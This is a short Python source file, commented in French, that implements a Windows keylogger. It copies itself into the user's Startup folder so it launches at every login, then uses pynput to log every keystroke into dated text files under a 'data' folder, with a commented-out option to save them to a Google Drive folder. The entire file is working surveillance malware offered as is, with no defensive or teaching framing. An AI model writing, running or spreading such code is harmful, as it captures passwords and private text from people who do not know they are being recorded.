from pynput.keyboard import Listener

import os
import logging 
import datetime
import time

from shutil import copyfile

username = os.getlogin()
nomFichierActuelle = os.path.basename(__file__)
print(nomFichierActuelle)
# **** copier pour qu'il s'allume au démarrage
copyfile(nomFichierActuelle,f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{nomFichierActuelle}")

# ****  on va ranger ça où ? le nom du fichier ? #####

#nomEmplacementSauvegarde = "G:/Mon Drive/KeyLogger Sauvegarde"
nomEmplacementSauvegarde = "data"
if not os.path.exists(nomEmplacementSauvegarde):
	os.makedirs(nomEmplacementSauvegarde)

dateajd = datetime.datetime.now().strftime('%Y-%m-%d')
dateheure = datetime.datetime.now().strftime('%H:%M:%S')

nomEmplacementSauvegarde += "/" + datetime.datetime.now().strftime('%Y-%m-%d')
if not os.path.exists(nomEmplacementSauvegarde):
	os.makedirs(nomEmplacementSauvegarde)
nomfile = username + " touch " + dateajd + ".txt"

# **** save sur le fichier texte
logging_dir = nomEmplacementSauvegarde
FORMATT = dateheure + " %(message)s"
logging.basicConfig(filename=f"{logging_dir}/{nomfile}", level=logging.DEBUG, format=FORMATT)


def on_press(key):
	mot = ""
	print(key)
	logging.info(key)

with Listener(on_press=on_press) as lis:
    lis.join()
   
    

	  

